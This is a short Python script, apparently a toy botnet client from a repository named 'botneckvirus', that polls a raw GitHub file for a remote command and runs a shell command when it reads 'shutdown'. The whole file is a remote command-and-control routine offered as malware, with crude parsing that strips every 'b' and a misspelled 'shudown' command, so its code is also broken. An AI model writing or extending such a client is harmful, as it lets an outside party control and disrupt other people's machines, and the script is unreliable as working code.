from subprocess import run as r

from urllib.request import urlopen

def getlatestcommand():
    enc_d = urlopen("https://raw.githubusercontent.com/MiniLackyLux/botneckvirus/main/sender")
    dec_d = str(enc_d.read())
    dec_d = dec_d.replace("\\n", "")
    dec_d = dec_d.replace("'", "")
    dec_d = dec_d.replace("b", "")
    return dec_d

if getlatestcommand() == "shutdown":
    r('shudown', shell=True)
